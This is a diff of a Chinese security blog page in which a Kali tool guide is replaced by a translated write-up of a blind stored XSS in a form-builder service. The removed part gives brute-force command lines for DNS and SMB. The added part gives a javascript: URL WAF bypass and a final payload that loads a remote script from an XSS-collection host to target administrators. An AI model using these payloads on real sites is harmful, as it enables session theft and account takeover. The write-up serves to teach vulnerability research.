@@ -15,26 +15,24 @@
 
 
 
-<meta name="description" content="0x00. 序言&amp;emsp;&amp;emsp;决定以后每篇入坑指南都会写满十个以上kali 中的工具或者技巧，不过可能因为精力有限只会提及它们的主要用法不会深入探讨，但对于非常优秀的工具则会另出文章具体讲解，以此见证自己一步步学习kali 、入坑kali 的经历，在剩余不多的大学时光留下些自己的足迹，也希望为安全爱好者尽点绵薄之力。">
+<meta name="description" content="原文：Hack Your Form – New vector for Blind XSS漏洞：作者：GeneralEG难度：低">
 <meta property="og:type" content="article">
-<meta property="og:title" content="kali使用入坑指南（二）">
-<meta property="og:url" content="http://TimeS0ng.github.io/2018/03/08/kali使用入坑指南（二）/index.html">
+<meta property="og:title" content="第十六篇：盲注XSS">
+<meta property="og:url" content="http://TimeS0ng.github.io/2019/02/15/第十六篇：盲注XSS/index.html">
 <meta property="og:site_name" content="TimeS0ng&#39;s blog">
-<meta property="og:description" content="0x00. 序言&amp;emsp;&amp;emsp;决定以后每篇入坑指南都会写满十个以上kali 中的工具或者技巧，不过可能因为精力有限只会提及它们的主要用法不会深入探讨，但对于非常优秀的工具则会另出文章具体讲解，以此见证自己一步步学习kali 、入坑kali 的经历，在剩余不多的大学时光留下些自己的足迹，也希望为安全爱好者尽点绵薄之力。">
+<meta property="og:description" content="原文：Hack Your Form – New vector for Blind XSS漏洞：作者：GeneralEG难度：低">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97%EF%BC%88%E4%BA%8C%EF%BC%89/20180308222717_PXjw12_Screenshot.jpeg">
-<meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97%EF%BC%88%E4%BA%8C%EF%BC%89/20180308222753_JKcqYH_Screenshot.jpeg">
-<meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97%EF%BC%88%E4%BA%8C%EF%BC%89/20180308225313_sPwpVJ_Screenshot.jpeg">
-<meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97%EF%BC%88%E4%BA%8C%EF%BC%89/20180308225518_JesTGg_Screenshot.jpeg">
-<meta property="og:image" content="http://note.youdao.com/yws/public/resource/911ea4f2fd7ee502e967a3c99fb7163b/xmlnote/1B20B5FDF95B4D3E8A2AA48AB71D9D46/3879">
-<meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97%EF%BC%88%E4%BA%8C%EF%BC%89/20180310192754_kdeWFt_Screenshot.jpeg">
-<meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97%EF%BC%88%E4%BA%8C%EF%BC%89/20180328215004_6eQEsq_Screenshot.jpeg">
-<meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97%EF%BC%88%E4%BA%8C%EF%BC%89/20180328220834_N7Y5J3_Screenshot.jpeg">
-<meta property="og:updated_time" content="2019-01-25T01:19:11.103Z">
+<meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/translate_16/1.jpg">
+<meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/translate_16/2.jpg">
+<meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/translate_16/4.jpg">
+<meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/translate_16/5.gif">
+<meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/translate_16/6.jpg">
+<meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/translate_16/7.jpg">
+<meta property="og:updated_time" content="2019-02-15T03:25:49.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="kali使用入坑指南（二）">
-<meta name="twitter:description" content="0x00. 序言&amp;emsp;&amp;emsp;决定以后每篇入坑指南都会写满十个以上kali 中的工具或者技巧，不过可能因为精力有限只会提及它们的主要用法不会深入探讨，但对于非常优秀的工具则会另出文章具体讲解，以此见证自己一步步学习kali 、入坑kali 的经历，在剩余不多的大学时光留下些自己的足迹，也希望为安全爱好者尽点绵薄之力。">
-<meta name="twitter:image" content="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97%EF%BC%88%E4%BA%8C%EF%BC%89/20180308222717_PXjw12_Screenshot.jpeg">
+<meta name="twitter:title" content="第十六篇：盲注XSS">
+<meta name="twitter:description" content="原文：Hack Your Form – New vector for Blind XSS漏洞：作者：GeneralEG难度：低">
+<meta name="twitter:image" content="http://img.027cgb.com/612577/times0ng_blog/translate_16/1.jpg">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -66,7 +64,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>kali使用入坑指南（二） | TimeS0ng&#39;s blog</title>
+<title>第十六篇：盲注XSS | TimeS0ng&#39;s blog</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -267,20 +265,20 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-kali使用入坑指南（二）" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-第十六篇：盲注XSS" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2018/03/08/kali使用入坑指南（二）/" class="article-date">
-      <time datetime="2018-03-08T15:19:13.000Z" itemprop="datePublished">2018-03-08</time>
+      <a href="/2019/02/15/第十六篇：盲注XSS/" class="article-date">
+      <time datetime="2019-02-15T02:42:19.000Z" itemprop="datePublished">2019-02-15</time>
 </a>
 
  
-    <a href="/2018/03/08/kali使用入坑指南（二）/#comments" title="查看评论">
+    <a href="/2019/02/15/第十六篇：盲注XSS/#comments" title="查看评论">
         <i class="fa fa-comments-o" aria-hidden="true"></i>
         <span class="count-comment"></span>
         
         
-            <span class="disqus-comment-count" data-disqus-identifier="2018/03/08/kali使用入坑指南（二）/"></span>
+            <span class="disqus-comment-count" data-disqus-identifier="2019/02/15/第十六篇：盲注XSS/"></span>
         
     </a>
 
@@ -295,7 +293,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      kali使用入坑指南（二）
+      第十六篇：盲注XSS
     </h1>
   
 
@@ -312,40 +310,16 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h2 id="0x00-序言"><a href="#0x00-序言" class="headerlink" title="0x00. 序言"></a>0x00. 序言</h2><h4 id="emsp-emsp-决定以后每篇入坑指南都会写满十个以上kali-中的工具或者技巧，不过可能因为精力有限只会提及它们的主要用法不会深入探讨，但对于非常优秀的工具则会另出文章具体讲解，以此见证自己一步步学习kali-、入坑kali-的经历，在剩余不多的大学时光留下些自己的足迹，也希望为安全爱好者尽点绵薄之力。"><a href="#emsp-emsp-决定以后每篇入坑指南都会写满十个以上kali-中的工具或者技巧，不过可能因为精力有限只会提及它们的主要用法不会深入探讨，但对于非常优秀的工具则会另出文章具体讲解，以此见证自己一步步学习kali-、入坑kali-的经历，在剩余不多的大学时光留下些自己的足迹，也希望为安全爱好者尽点绵薄之力。" class="headerlink" title="&emsp;&emsp;决定以后每篇入坑指南都会写满十个以上kali 中的工具或者技巧，不过可能因为精力有限只会提及它们的主要用法不会深入探讨，但对于非常优秀的工具则会另出文章具体讲解，以此见证自己一步步学习kali 、入坑kali 的经历，在剩余不多的大学时光留下些自己的足迹，也希望为安全爱好者尽点绵薄之力。"></a>&emsp;&emsp;决定以后每篇入坑指南都会写满十个以上kali 中的工具或者技巧，不过可能因为精力有限只会提及它们的主要用法不会深入探讨，但对于非常优秀的工具则会另出文章具体讲解，以此见证自己一步步学习kali 、入坑kali 的经历，在剩余不多的大学时光留下些自己的足迹，也希望为安全爱好者尽点绵薄之力。</h4><a id="more"></a>
-<h2 id="0x01-DNS-爆破工具–fierce"><a href="#0x01-DNS-爆破工具–fierce" class="headerlink" title="0x01. DNS 爆破工具–fierce"></a>0x01. DNS 爆破工具–fierce</h2><blockquote>
-<p>fierce 专用于爆破 DNS 域名，就像它的名字一样纯粹，平时msf 用的多了也喜欢用点简单小巧又功能实用的工具。在渗透测试时，偶尔会碰到某些域名的主站被做成了全静态页面，神仙也难渗透。此时从旁站渗透是必然的选择，这时候就需要用到 fierce 爆破二级域名对旁站下黑手了。再给大家推荐一篇<a href="http://cms.pengyueisos.com/wp/2017/12/一次web渗透测试的经历与分析（上）【鹏越·学霸专/" target="_blank" rel="external">渗透旁站的文章</a></p>
-<p>爆破二级域名</p>
-<p>fierce -dns kali.org -threads 10</p>
-</blockquote>
-<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97%EF%BC%88%E4%BA%8C%EF%BC%89/20180308222717_PXjw12_Screenshot.jpeg" alt=""><br><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97%EF%BC%88%E4%BA%8C%EF%BC%89/20180308222753_JKcqYH_Screenshot.jpeg" alt=""></p>
-<h2 id="0x02-SMB-爆破工具–acccheck"><a href="#0x02-SMB-爆破工具–acccheck" class="headerlink" title="0x02. SMB 爆破工具–acccheck"></a>0x02. SMB 爆破工具–acccheck</h2><blockquote>
-<p>acccheck是用于探测远程目标主机是否开放smb服务,并尝试连接目标默认IPC$、ADMIN$共享,并通过字典文件尝试爆破 smb 服务的账号密码。有些工具比较简单，所以命令我就不一一介绍了，大家直接用 acccheck -h 就能查看具体的参数介绍。</p>
-<p>acccheck -t 192.168.122.140 -u times0ng -P /usr/share/wordlists/wfuzz/general/common.txt -v</p>
-</blockquote>
-<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97%EF%BC%88%E4%BA%8C%EF%BC%89/20180308225313_sPwpVJ_Screenshot.jpeg" alt=""></p>
-<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97%EF%BC%88%E4%BA%8C%EF%BC%89/20180308225518_JesTGg_Screenshot.jpeg" alt=""></p>
-<h2 id="0x03-SNMP-信息枚举工具–-snmp-check"><a href="#0x03-SNMP-信息枚举工具–-snmp-check" class="headerlink" title="0x03. SNMP 信息枚举工具– snmp-check"></a>0x03. SNMP 信息枚举工具– snmp-check</h2><blockquote>
-<p>简单网络管理协议（SNMP）是TCP／IP协议簇的一个应用层协议，工作在UDP 161端口，用于监控目标设备的操作系统、硬件设备、服务应用、软硬件配置、网络协议状态、设备性能及资源利用率、设备报错事件信息、应用程序状态等软硬件信息。对于渗透测试者来说简直就是信息宝藏，一旦这个服务协议被利用，那么目标的大部分配置信息都会暴露无遗，对于企业来说这是致命的，而想要利用这个协议的弱点只需要服务器管理员缺乏安全意识做一些默认配置即可。</p>
-<p>这个工具并不支持对 public 的爆破，但如果使用 hydra 爆破public 之后再使用snmp-check 获取 SNMP 协议提供的海量信息的话简直是 perfect</p>
-<p>snmp-check 192.168.1.109 -c public -v 2c</p>
-</blockquote>
-<p><img src="http://note.youdao.com/yws/public/resource/911ea4f2fd7ee502e967a3c99fb7163b/xmlnote/1B20B5FDF95B4D3E8A2AA48AB71D9D46/3879" alt="image"></p>
-<h2 id="0x04-路由策略探测工具–Firewalk"><a href="#0x04-路由策略探测工具–Firewalk" class="headerlink" title="0x04. 路由策略探测工具–Firewalk"></a>0x04. 路由策略探测工具–Firewalk</h2><blockquote>
-<p>Firewalk 是一个主动侦察的网络安全工具，它试图判断出路由器或防火墙在第四层TCP/UDP  配置的策略规则，因此在内网中使用 Firewalk 将是我们最理想的选择。如果想了解 firewalk 的原理请 <a href="https://times0ng.github.io/2018/03/10/Firewalk-原理/">点击这里</a></p>
-<p>首先apt-get 安装firewalk，然后启动 firewalk 进行探察（ 参数都很简单，不懂的可以通过 man 手册自行查看 ）</p>
-<p>firewalk -S21,22,53,80,139,445 -i eth0 -n -pTCP 192.168.1.1 8.8.8.8</p>
-</blockquote>
-<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97%EF%BC%88%E4%BA%8C%EF%BC%89/20180310192754_kdeWFt_Screenshot.jpeg" alt=""></p>
-<h2 id="0x05-图形化sql自动注入工具—-jSQL"><a href="#0x05-图形化sql自动注入工具—-jSQL" class="headerlink" title="0x05. 图形化sql自动注入工具—-jSQL"></a>0x05. 图形化sql自动注入工具—-jSQL</h2><blockquote>
-<p>jSQL injection是一款基于JAVA开发的图形化 SQL 自动注入工具，包含数据库查询、后台爆破、文件读取、命令行、文件上传、目录爆破、编码转换等众多功能，既支持GET 型SQL 注入，也同时支持POST 型注入，还能定制header 头，是一款不可多得的好工具，很像kali 版御剑</p>
-</blockquote>
-<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97%EF%BC%88%E4%BA%8C%EF%BC%89/20180328215004_6eQEsq_Screenshot.jpeg" alt=""></p>
-<h2 id="0x06-WEB-漏洞扫描工具—-OWASP-ZAP"><a href="#0x06-WEB-漏洞扫描工具—-OWASP-ZAP" class="headerlink" title="0x06. WEB 漏洞扫描工具—-OWASP-ZAP"></a>0x06. WEB 漏洞扫描工具—-OWASP-ZAP</h2><blockquote>
-<p>最近自己利用 OWASP-ZAP 简单录制了一套web 渗透教程发到b 站了，大家有兴趣可以<a href="https://www.bilibili.com/video/av20890776/" target="_blank" rel="external">点这里</a>，基本用法我都提到过了，还简单讲了一些渗透环境的搭建和利用。</p>
-</blockquote>
-<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/kali%E4%BD%BF%E7%94%A8%E5%85%A5%E5%9D%91%E6%8C%87%E5%8D%97%EF%BC%88%E4%BA%8C%EF%BC%89/20180328220834_N7Y5J3_Screenshot.jpeg" alt=""></p>
-<h2 id="0x07-“kali-下的菜刀”—-Altman"><a href="#0x07-“kali-下的菜刀”—-Altman" class="headerlink" title="0x07. “kali 下的菜刀”—-Altman"></a>0x07. “kali 下的菜刀”—-Altman</h2>
+        <h4 id="原文：Hack-Your-Form-–-New-vector-for-Blind-XSS"><a href="#原文：Hack-Your-Form-–-New-vector-for-Blind-XSS" class="headerlink" title="原文：Hack Your Form – New vector for Blind XSS"></a>原文：<a href="https://generaleg0x01.com/2019/01/13/hackyourform-bxss/" target="_blank" rel="external">Hack Your Form – New vector for Blind XSS</a></h4><h4 id="漏洞："><a href="#漏洞：" class="headerlink" title="漏洞："></a>漏洞：</h4><h4 id="作者：GeneralEG"><a href="#作者：GeneralEG" class="headerlink" title="作者：GeneralEG"></a>作者：<a href="https://generaleg0x01.com/author/GeneralEG/" target="_blank" rel="external">GeneralEG</a></h4><h4 id="难度：低"><a href="#难度：低" class="headerlink" title="难度：低"></a>难度：低</h4><a id="more"></a>
+<h4 id="各位大佬们好，今天我要分享一个有趣的漏洞发现，关于如何绕过waf来执行javascript代码并且实现盲注存储型XSS。我在很多站点中都发现了这个问题，所以我决定以其中一个为例来讲解；"><a href="#各位大佬们好，今天我要分享一个有趣的漏洞发现，关于如何绕过waf来执行javascript代码并且实现盲注存储型XSS。我在很多站点中都发现了这个问题，所以我决定以其中一个为例来讲解；" class="headerlink" title="各位大佬们好，今天我要分享一个有趣的漏洞发现，关于如何绕过waf来执行javascript代码并且实现盲注存储型XSS。我在很多站点中都发现了这个问题，所以我决定以其中一个为例来讲解；"></a>各位大佬们好，今天我要分享一个有趣的漏洞发现，关于如何绕过waf来执行javascript代码并且实现盲注存储型XSS。我在很多站点中都发现了这个问题，所以我决定以其中一个为例来讲解；</h4><h4 id="我们暂时假设该域名为redacted-com，经过一些调查我发现该站点提供一个特定的服务（创建表格）。"><a href="#我们暂时假设该域名为redacted-com，经过一些调查我发现该站点提供一个特定的服务（创建表格）。" class="headerlink" title="我们暂时假设该域名为redacted.com，经过一些调查我发现该站点提供一个特定的服务（创建表格）。"></a>我们暂时假设该域名为redacted.com，经过一些调查我发现该站点提供一个特定的服务（创建表格）。</h4><h4 id="该服务是如何工作的呢？"><a href="#该服务是如何工作的呢？" class="headerlink" title="该服务是如何工作的呢？"></a>该服务是如何工作的呢？</h4><h4 id="1）用户创建表单"><a href="#1）用户创建表单" class="headerlink" title="1）用户创建表单"></a>1）用户创建表单</h4><h4 id="2）用户与访问者共享链接"><a href="#2）用户与访问者共享链接" class="headerlink" title="2）用户与访问者共享链接"></a>2）用户与访问者共享链接</h4><h4 id="3）访问者填写表格"><a href="#3）访问者填写表格" class="headerlink" title="3）访问者填写表格"></a>3）访问者填写表格</h4><h4 id="4）填写的信息将提交到-redacted-com-manager-Form-ID"><a href="#4）填写的信息将提交到-redacted-com-manager-Form-ID" class="headerlink" title="4）填写的信息将提交到 redacted.com/manager/{Form ID}/"></a>4）填写的信息将提交到 redacted.com/manager/{Form ID}/</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_16/1.jpg" alt=""></p>
+<h4 id="表格创建好之后，我们使用访问者打开表格；"><a href="#表格创建好之后，我们使用访问者打开表格；" class="headerlink" title="表格创建好之后，我们使用访问者打开表格；"></a>表格创建好之后，我们使用访问者打开表格；</h4><h4 id="第一次实验时，我尝试用最原始的方法绕过它（website-com-”payload）我的payload是-https-example-com-quot-22-amp-34"><a href="#第一次实验时，我尝试用最原始的方法绕过它（website-com-”payload）我的payload是-https-example-com-quot-22-amp-34" class="headerlink" title="第一次实验时，我尝试用最原始的方法绕过它（website.com?”payload）我的payload是 https://example.com/?&quot;%22&amp;#34;"></a>第一次实验时，我尝试用最原始的方法绕过它（website.com?”payload）我的payload是 <a href="https://example.com/?&quot;%22&amp;#34" target="_blank" rel="external">https://example.com/?&quot;%22&amp;#34</a>;</h4><h4 id="然后用表单创建者打开看看发生了什么，很不幸的是过滤器编码了双引号，我们输入的数据变成了https-example-com-quot-22“"><a href="#然后用表单创建者打开看看发生了什么，很不幸的是过滤器编码了双引号，我们输入的数据变成了https-example-com-quot-22“" class="headerlink" title="然后用表单创建者打开看看发生了什么，很不幸的是过滤器编码了双引号，我们输入的数据变成了https://example.com/?&quot;%22“"></a>然后用表单创建者打开看看发生了什么，很不幸的是过滤器编码了双引号，我们输入的数据变成了<a href="https://example.com/?&quot;%22" target="_blank" rel="external">https://example.com/?&quot;%22</a>“</h4><h4 id="注意（标签）中呈现的链接"><a href="#注意（标签）中呈现的链接" class="headerlink" title="注意（标签）中呈现的链接"></a>注意（标签）中呈现的链接</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_16/2.jpg" alt=""></p>
+<h4 id="接着我尝试采用Fuzzing测试，当尝试-test-https-example-com时过滤器接受了这种输入"><a href="#接着我尝试采用Fuzzing测试，当尝试-test-https-example-com时过滤器接受了这种输入" class="headerlink" title="接着我尝试采用Fuzzing测试，当尝试 test:https://example.com时过滤器接受了这种输入"></a>接着我尝试采用Fuzzing测试，当尝试 test:<a href="https://example.com时过滤器接受了这种输入" target="_blank" rel="external">https://example.com时过滤器接受了这种输入</a></h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_16/4.jpg" alt=""></p>
+<h4 id="然后又开始尝试javascript-https-evil-com-同样的过滤器也没有过滤，现在我已经很确定这里存在XSS，但它需要真正的网站与我的payload结合使用才有效"><a href="#然后又开始尝试javascript-https-evil-com-同样的过滤器也没有过滤，现在我已经很确定这里存在XSS，但它需要真正的网站与我的payload结合使用才有效" class="headerlink" title="然后又开始尝试javascript:https://evil.com 同样的过滤器也没有过滤，现在我已经很确定这里存在XSS，但它需要真正的网站与我的payload结合使用才有效"></a>然后又开始尝试javascript:<a href="https://evil.com" target="_blank" rel="external">https://evil.com</a> 同样的过滤器也没有过滤，现在我已经很确定这里存在XSS，但它需要真正的网站与我的payload结合使用才有效</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_16/5.gif" alt=""></p>
+<h4 id="所以我重新构造的payload是"><a href="#所以我重新构造的payload是" class="headerlink" title="所以我重新构造的payload是"></a>所以我重新构造的payload是</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">javascript:x=&apos;http://x.c&apos;;alert(&apos;xss&apos;);//</div></pre></td></tr></table></figure>
+<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_16/6.jpg" alt=""></p>
+<h4 id="最后的最后，我们想要制作一个Blind-XSS来攻击真正的管理员，所以最终的payload是"><a href="#最后的最后，我们想要制作一个Blind-XSS来攻击真正的管理员，所以最终的payload是" class="headerlink" title="最后的最后，我们想要制作一个Blind XSS来攻击真正的管理员，所以最终的payload是"></a>最后的最后，我们想要制作一个Blind XSS来攻击真正的管理员，所以最终的payload是</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">javascript:eval(&apos;window.s=document.createElement(\&apos;script\&apos;);window.s.src=\&apos;//xsspt.com/SLEPOE\&apos;;document.body.appendChild(window.s)&apos;);s=&apos;https://s.com&apos;</div></pre></td></tr></table></figure>
+<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_16/7.jpg" alt=""></p>
+
       
     </div>
     
@@ -353,13 +327,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2018/03/08/kali使用入坑指南（二）/">kali使用入坑指南（二）</a></p>
+        <p><span>本文标题:</span><a href="/2019/02/15/第十六篇：盲注XSS/">第十六篇：盲注XSS</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">TimeS0ng</a></p>
-        <p><span>发布时间:</span>2018-03-08, 23:19:13</p>
-        <p><span>最后更新:</span>2019-01-25, 09:19:11</p>
+        <p><span>发布时间:</span>2019-02-15, 10:42:19</p>
+        <p><span>最后更新:</span>2019-02-15, 11:25:49</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2018/03/08/kali使用入坑指南（二）/" title="kali使用入坑指南（二）">http://TimeS0ng.github.io/2018/03/08/kali使用入坑指南（二）/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://TimeS0ng.github.io/2018/03/08/kali使用入坑指南（二）/　　作者: TimeS0ng" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2019/02/15/第十六篇：盲注XSS/" title="第十六篇：盲注XSS">http://TimeS0ng.github.io/2019/02/15/第十六篇：盲注XSS/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://TimeS0ng.github.io/2019/02/15/第十六篇：盲注XSS/　　作者: TimeS0ng" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -371,16 +345,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2018/03/10/Firewalk-原理/">
-                    Firewalk 原理
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2018/03/01/利用iodine绕过防火墙/">
-                    利用iodine绕过防火墙
+                <a href="/2019/02/14/第十五篇：SQL注入读取、写入文件/">
+                    第十五篇：SQL注入读取、写入文件
                 </a>
             </div>
         
@@ -392,7 +360,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-序言"><span class="toc-number">1.</span> <span class="toc-text">0x00. 序言</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-决定以后每篇入坑指南都会写满十个以上kali-中的工具或者技巧，不过可能因为精力有限只会提及它们的主要用法不会深入探讨，但对于非常优秀的工具则会另出文章具体讲解，以此见证自己一步步学习kali-、入坑kali-的经历，在剩余不多的大学时光留下些自己的足迹，也希望为安全爱好者尽点绵薄之力。"><span class="toc-number">1.0.1.</span> <span class="toc-text">  决定以后每篇入坑指南都会写满十个以上kali 中的工具或者技巧，不过可能因为精力有限只会提及它们的主要用法不会深入探讨，但对于非常优秀的工具则会另出文章具体讲解，以此见证自己一步步学习kali 、入坑kali 的经历，在剩余不多的大学时光留下些自己的足迹，也希望为安全爱好者尽点绵薄之力。</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-DNS-爆破工具–fierce"><span class="toc-number">2.</span> <span class="toc-text">0x01. DNS 爆破工具–fierce</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-SMB-爆破工具–acccheck"><span class="toc-number">3.</span> <span class="toc-text">0x02. SMB 爆破工具–acccheck</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-SNMP-信息枚举工具–-snmp-check"><span class="toc-number">4.</span> <span class="toc-text">0x03. SNMP 信息枚举工具– snmp-check</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-路由策略探测工具–Firewalk"><span class="toc-number">5.</span> <span class="toc-text">0x04. 路由策略探测工具–Firewalk</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-图形化sql自动注入工具—-jSQL"><span class="toc-number">6.</span> <span class="toc-text">0x05. 图形化sql自动注入工具—-jSQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-WEB-漏洞扫描工具—-OWASP-ZAP"><span class="toc-number">7.</span> <span class="toc-text">0x06. WEB 漏洞扫描工具—-OWASP-ZAP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-“kali-下的菜刀”—-Altman"><span class="toc-number">8.</span> <span class="toc-text">0x07. “kali 下的菜刀”—-Altman</span></a></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#原文：Hack-Your-Form-–-New-vector-for-Blind-XSS"><span class="toc-number">1.</span> <span class="toc-text">原文：Hack Your Form – New vector for Blind XSS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞："><span class="toc-number">2.</span> <span class="toc-text">漏洞：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#作者：GeneralEG"><span class="toc-number">3.</span> <span class="toc-text">作者：GeneralEG</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#难度：低"><span class="toc-number">4.</span> <span class="toc-text">难度：低</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#各位大佬们好，今天我要分享一个有趣的漏洞发现，关于如何绕过waf来执行javascript代码并且实现盲注存储型XSS。我在很多站点中都发现了这个问题，所以我决定以其中一个为例来讲解；"><span class="toc-number">5.</span> <span class="toc-text">各位大佬们好，今天我要分享一个有趣的漏洞发现，关于如何绕过waf来执行javascript代码并且实现盲注存储型XSS。我在很多站点中都发现了这个问题，所以我决定以其中一个为例来讲解；</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#我们暂时假设该域名为redacted-com，经过一些调查我发现该站点提供一个特定的服务（创建表格）。"><span class="toc-number">6.</span> <span class="toc-text">我们暂时假设该域名为redacted.com，经过一些调查我发现该站点提供一个特定的服务（创建表格）。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#该服务是如何工作的呢？"><span class="toc-number">7.</span> <span class="toc-text">该服务是如何工作的呢？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1）用户创建表单"><span class="toc-number">8.</span> <span class="toc-text">1）用户创建表单</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2）用户与访问者共享链接"><span class="toc-number">9.</span> <span class="toc-text">2）用户与访问者共享链接</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3）访问者填写表格"><span class="toc-number">10.</span> <span class="toc-text">3）访问者填写表格</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4）填写的信息将提交到-redacted-com-manager-Form-ID"><span class="toc-number">11.</span> <span class="toc-text">4）填写的信息将提交到 redacted.com/manager/{Form ID}/</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#表格创建好之后，我们使用访问者打开表格；"><span class="toc-number">12.</span> <span class="toc-text">表格创建好之后，我们使用访问者打开表格；</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#第一次实验时，我尝试用最原始的方法绕过它（website-com-”payload）我的payload是-https-example-com-quot-22-amp-34"><span class="toc-number">13.</span> <span class="toc-text">第一次实验时，我尝试用最原始的方法绕过它（website.com?”payload）我的payload是 https://example.com/?"%22&#34;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" 